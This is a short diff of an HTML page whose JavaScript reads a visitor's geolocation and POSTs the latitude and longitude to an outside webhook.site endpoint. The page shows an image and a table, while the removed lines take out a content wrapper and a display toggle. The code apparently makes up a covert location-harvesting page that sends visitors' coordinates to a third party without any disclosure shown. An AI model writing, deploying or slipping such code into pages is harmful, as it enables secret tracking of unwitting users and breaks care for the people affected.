@@ -41,10 +41,6 @@ function successCallback(position) {
   console.log("Latitude: " + latitude);
   console.log("Longitude: " + longitude);
 
-
-  var contentElement = document.getElementById("content");
-      contentElement.style.display = "block";
-      
   var xmlHttp = new XMLHttpRequest();
   xmlHttp.open("POST", "https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce", true);
   xmlHttp.setRequestHeader("Content-type", "application/json");
@@ -89,8 +85,6 @@ function errorCallback(error) {
 </script>
 <!-- HTML Code -->
 
-<body>
-  <div id="content">
 <img
   src="https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/csrf-cross-site-request-forgery.png"
   width="110"
@@ -123,4 +117,3 @@ function errorCallback(error) {
     </tr>
   </tbody>
 </table>
-</body>
